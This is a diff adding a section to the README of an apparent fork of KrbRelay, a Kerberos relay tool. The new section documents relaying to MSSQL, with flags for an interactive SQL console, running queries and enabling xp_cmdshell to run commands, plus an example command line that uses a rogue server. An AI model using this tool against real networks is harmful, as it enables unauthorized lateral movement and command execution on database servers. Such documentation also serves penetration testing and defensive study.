@@ -197,6 +197,22 @@ KrbRelay.exe -spn cifs/win10.htb.local -clsid 0289a7c5-91bf-4547-81ae-fec91a89de
 ````
 Also added `-skip-check` option to avoid using the `CheckPort` function, make sure to pass `-port` to force COM to listen on that port, useful when dealing with firewall.
 
+### Added MSSQL Support
+This fork allows relay to MSSQL in addition to the original repo which supported CIFS, HTTP and LDAP.
+
+```
+MSSQL attacks (SPN: MSSQLSvc/host.domain:1433):
+-console                         Interactive SQL console
+-query <SQL>                     Run a SQL batch and print the result set
+-mssql-exec <COMMAND>            Enable and run xp_cmdshell <COMMAND>
+(no attack)                      SELECT SYSTEM_USER / sysadmin check
+```
+
+An example usage is as follows:
+
+```
+KrbRelay.exe -spn <SPN> -clsid <CLSID> -session <SESSION_ID> -rogue <ROGUE_SERVER_IP> -rogue-port <ROGUE_SERVER_PORT> -console
+```
 
 ### Acknowledgements
 
